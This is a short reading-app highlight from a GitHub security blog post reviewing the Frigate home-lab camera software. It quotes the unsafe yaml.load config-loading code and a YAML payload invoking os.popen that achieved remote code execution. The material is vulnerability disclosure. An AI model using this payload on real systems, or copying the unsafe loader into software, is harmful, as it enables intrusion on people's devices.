---
author: Madison Oliver
aliases: ["Securing Our Home Labs: Frigate Code Review"]
tags: [readwise/articles]
url: https://github.blog/security/vulnerability-research/securing-our-home-labs-frigate-code-review/
date: 2024-12-19
---
# Securing Our Home Labs: Frigate Code Review

![rw-book-cover](https://github.blog/wp-content/uploads/2023/10/Security-DarkMode-4.png?fit=1200%2C630)

## Highlights


However, `load_config_with_no_duplicates` uses [`yaml.loader.Loader`](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/util/builtin.py#L90) which can **instantiate custom constructors**. A provided payload will be executed directly:
```python
 PreserveDuplicatesLoader.add_constructor(
	 yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, map_constructor
 )
 return yaml.load(raw_config, PreserveDuplicatesLoader)
```
 In this scenario providing a payload like the following (invoking `os.popen` to run `touch /tmp/pwned`) was sufficient to achieve **remote code execution**
 ```yaml
 !!python/object/apply:os.popen
 - touch /tmp/pwned
```
> [View Highlight](https://read.readwise.io/read/01jffq2zgvrhfsd3bg3n7y89rc)

